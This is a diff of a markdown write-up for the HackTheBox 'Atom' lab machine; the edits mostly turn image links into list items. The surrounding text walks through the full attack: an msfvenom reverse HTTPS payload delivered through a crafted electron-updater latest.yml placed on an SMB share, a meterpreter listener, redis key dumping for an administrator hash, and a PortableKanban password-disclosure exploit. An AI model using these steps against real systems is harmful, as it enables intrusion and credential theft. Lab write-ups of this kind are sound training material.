@@ -21,9 +21,9 @@ description: HackTheBox Atom Writeup.
 ## FOOTHOLD
 
 - Start a nmap scan with default script and version detections and the verbosity flag turned on to see open ports on the fly without having to wait for the scan to finish.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom1.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom1.png)
 - A full port scan reveals redis is active on port `6379` along w winrm at 5985 which shows we can probably use remoting with authentic creds.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom2.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom2.png)
 - We start off by enumerating port 80.
     - We find a possible username at the end of the page: MrR3boot@atom.htb.
     - From this we infer and add `atom.htb` to our `/etc/hosts` file. Continue browsing the site.
@@ -32,7 +32,7 @@ description: HackTheBox Atom Writeup.
 ### Enumerating redis
 
 - Much cant be enumerated since redis requires credentials to authenticate. Checking the format of authentication shows it requires only the password. We could attempt to brute force the password if nothing turns up from smb.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom7.png)
+    - - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom7.png)
 
 ### Enumerating smb
 
@@ -55,11 +55,11 @@ description: HackTheBox Atom Writeup.
 
 ***GETTING user.txt***
 - Generate an msfvenom payload of choice . Generate a reverse https executable and then rename it with single quotes.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom8.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom8.png)
 - Rename the file to the filename as `d'payload.exe` as shown.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom10.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom10.png)
 - Calculate the hash using the prescribed syntax as shown below: 
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom9.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom9.png)
 - Setup a listener on msfconsole to catch your shell using `multi/handler`.
 - Generate the `latest.yml` file update. Replace the path and the hash.
     ```bash
@@ -69,18 +69,18 @@ description: HackTheBox Atom Writeup.
     ```
 - Start a server to host `d'payload.exe` using: `sudo python -m SimpleHTTPServer 80`
 - Finally put the update file in one of the client folders on the share using smbclient. Wait for about 15-20 secs and let the update happen. A meterpreter shell is recieved.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom11.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom11.png)
 - A getuid command confirms we are `ATOM\jason`.
 - Retrive `user.txt` from jason's dekstop folder.
 
 ***GETTING root.txt***
 - Enumerate the host with winpeas. Begin by dropping winpeas on the box.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom12.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom12.png)
 - Jason's credentials do not allow `winrm` remoting. A user guide pdf exists which we might have a look at if needed.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom13.jpg)
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom17.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom13.jpg)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom17.png)
 - Since we already know redis was on,  we find its config file. 
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom14.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom14.png)
 - We finally found the password for the redis server. 
     - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom15.jpg)
 - Use this [guide](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) as a reference to pentest redis.
@@ -93,10 +93,10 @@ description: HackTheBox Atom Writeup.
     `info keyspace`
     4. We see that there is one databse - number 0 which has 4 keys. View the keys using: `keys *`
     5. We see a bunch of keys. Retrieve the first or last, it might most likely be the administrator's key: `get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0`
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom16.jpg)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom16.jpg)
 - We now have the administrator hash.
 - Ater looking a lot on how to decrypt the hash i decided to look back at the "User guide.pdf" to look for further clues.
-    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom18.png)
+    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Atom_Writeup/images/atom18.png)
 - Googling around it is figured that portable-kanban stores the settings for the encrypted password.
 - Searching around for an exploit an encrypted password disclosure vulnerability is found [here](https://www.torchsec.net/portablekanban-4-3-6578-38136-encrypted-password-disclosure-torchsec/).
 - Remove the unnecessary `except` statement.
